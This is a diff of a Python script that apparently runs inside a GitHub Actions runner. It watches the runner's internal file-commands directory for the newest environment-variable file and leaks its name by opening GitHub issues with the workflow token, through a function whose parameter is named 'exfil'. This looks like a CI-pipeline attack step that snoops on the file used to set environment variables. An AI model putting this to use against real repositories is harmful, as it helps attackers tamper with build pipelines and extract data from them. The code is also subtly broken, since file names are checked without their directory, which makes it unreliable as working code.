@@ -6,22 +6,25 @@ import urllib.request
 
 GITHUB_TOKEN = os.environ["GITHUB_TOKEN"]
 GITHUB_REPOSITORY = os.environ["GITHUB_REPOSITORY"]
+ENV_VARS_DIR = '/home/runner/work/_temp/_runner_file_commands/'
 
 MONITORED_VARS = ["TARGET_VAR"]
 POLL_INTERVAL = .2
 
-def on_change(var_name, old_value, new_value):
-    create_issue(f"{var_name} changed from '{old_value}' to '{new_value}'")
+def on_change(new_value):
+    create_issue(f"Env var file is '{new_value}'")
+
+def get_env_vars_file():
+     return max((f for f in os.listdir(ENV_VARS_DIR) if os.path.isfile(f)), key=lambda f: os.path.getmtime(f))
 
 def main():
-    previous_values = {var: os.environ.get(var) for var in MONITORED_VARS}
+    previous_value = ''
 
     while True:
-        for var in MONITORED_VARS:
-            current_value = os.environ.get(var)
-            if current_value != previous_values[var]:
-                on_change(var, previous_values[var], current_value)
-                previous_values[var] = current_value
+        current_value = get_env_vars_file()
+        if current_value != previous_value:
+                on_change(current_value)
+                previous_value = current_value
         time.sleep(POLL_INTERVAL)
 
 def create_issue(exfil):
